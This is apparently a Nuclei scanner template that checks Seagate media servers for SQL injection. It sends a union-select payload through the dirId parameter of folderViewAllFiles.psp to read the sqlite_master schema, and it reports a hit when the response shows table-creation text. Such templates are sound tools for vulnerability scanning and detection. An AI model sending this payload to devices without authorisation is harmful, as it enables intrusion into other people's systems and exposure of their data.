id: Seagate-media-sqli
info:
  author: Str1am
  name: "Seagate\u591A\u5A92\u4F53\u670D\u52A1\u5668sql\u6CE8\u5165\u6F0F\u6D1E"
  severity: high
  tags: Seagate,sqli
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - thumbUrl
    - parentdirId
    - CREATE TRIGGER
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/folderViewAllFiles.psp?start=0&count=60&url=%2F&dirId=\%27+union+select+null,name,null,sql,null,null+from+sqlite_master+--+'
